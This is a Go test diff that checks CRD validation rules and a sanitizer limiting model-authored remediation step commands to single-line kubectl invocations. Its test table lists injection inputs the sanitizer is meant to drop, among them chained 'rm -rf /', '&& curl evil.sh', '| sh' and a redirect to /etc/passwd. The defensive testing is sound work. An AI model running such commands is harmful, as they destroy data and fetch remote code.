@@ -11,6 +11,7 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -288,8 +289,95 @@ func TestRemediationStepsEnumInGeneratedCRD(t *testing.T) {
 
 	// The step-safety invariant is enforced at the API server via a CEL rule:
 	// a step may be autoExecutable only when its type is persona-update.
-	rules := steps.Items.Schema.XValidations
-	require.NotEmpty(t, rules, "RemediationStep must carry an XValidation CEL rule")
-	require.Contains(t, rules[0].Rule, "self.autoExecutable")
-	require.Contains(t, rules[0].Rule, StepTypePersonaUpdate)
+	// The command guard is enforced the same way: a step command must be a
+	// kubectl invocation, so the API server rejects anything else even if a
+	// client bypasses SanitizeStepCommand.
+	celRules := make([]string, 0, len(steps.Items.Schema.XValidations))
+	for _, r := range steps.Items.Schema.XValidations {
+		celRules = append(celRules, r.Rule)
+	}
+	require.NotEmpty(t, celRules, "RemediationStep must carry XValidation CEL rules")
+
+	require.Condition(t, func() bool {
+		for _, r := range celRules {
+			if strings.Contains(r, "self.autoExecutable") && strings.Contains(r, StepTypePersonaUpdate) {
+				return true
+			}
+		}
+		return false
+	}, "missing the autoExecutable CEL rule, got %v", celRules)
+
+	require.Condition(t, func() bool {
+		for _, r := range celRules {
+			if strings.Contains(r, "self.command") && strings.Contains(r, "kubectl ") {
+				return true
+			}
+		}
+		return false
+	}, "missing the command CEL rule, got %v", celRules)
+
+	command := steps.Items.Schema.Properties["command"]
+	require.Equal(t, "string", command.Type, "spec.steps[].command missing from CRD schema")
+	require.NotNil(t, command.MaxLength)
+	require.Equal(t, int64(MaxStepCommandLength), *command.MaxLength)
+	require.NotContains(t, steps.Items.Schema.Required, "command", "command must stay optional")
+}
+
+// TestSanitizeStepCommand covers the display guard for model-authored step
+// commands: only single-line kubectl invocations without shell metacharacters
+// survive, everything else is dropped rather than repaired.
+func TestSanitizeStepCommand(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{
+			name: "keeps a plain kubectl command",
+			in:   "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
+			want: "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
+		},
+		{
+			name: "trims surrounding whitespace",
+			in:   "  kubectl rollout restart deployment/web -n demo  ",
+			want: "kubectl rollout restart deployment/web -n demo",
+		},
+		{
+			name: "keeps a quoted JSON patch",
+			in:   `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
+			want: `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
+		},
+		{name: "drops empty", in: "", want: ""},
+		{name: "drops whitespace only", in: "   ", want: ""},
+		{name: "drops a non-kubectl binary", in: "helm uninstall dorgu-operator", want: ""},
+		{name: "drops bare kubectl with no arguments", in: "kubectl", want: ""},
+		{name: "drops a kubectl-prefixed impostor", in: "kubectlfoo get pods", want: ""},
+		{name: "drops command chaining", in: "kubectl get pods; rm -rf /", want: ""},
+		{name: "drops backgrounded chaining", in: "kubectl get pods && curl evil.sh", want: ""},
+		{name: "drops pipes", in: "kubectl get pods | sh", want: ""},
+		{name: "drops redirection", in: "kubectl get pods > /etc/passwd", want: ""},
+		{name: "drops command substitution", in: "kubectl delete ns $(cat /tmp/ns)", want: ""},
+		{name: "drops backticks", in: "kubectl delete ns `cat /tmp/ns`", want: ""},
+		{name: "drops variable expansion", in: "kubectl apply -f $HOME/evil.yaml", want: ""},
+		{name: "drops a second line", in: "kubectl get pods\nrm -rf /", want: ""},
+		{name: "drops a carriage return", in: "kubectl get pods\rrm -rf /", want: ""},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			require.Equal(t, tt.want, SanitizeStepCommand(tt.in))
+		})
+	}
+
+	t.Run("drops a command over the length bound", func(t *testing.T) {
+		long := "kubectl annotate deployment web " + strings.Repeat("a", MaxStepCommandLength)
+		require.Equal(t, "", SanitizeStepCommand(long))
+	})
+
+	t.Run("keeps a command at the length bound", func(t *testing.T) {
+		prefix := "kubectl annotate deployment web note="
+		at := prefix + strings.Repeat("a", MaxStepCommandLength-len(prefix))
+		require.Len(t, at, MaxStepCommandLength)
+		require.Equal(t, at, SanitizeStepCommand(at))
+	})
 }
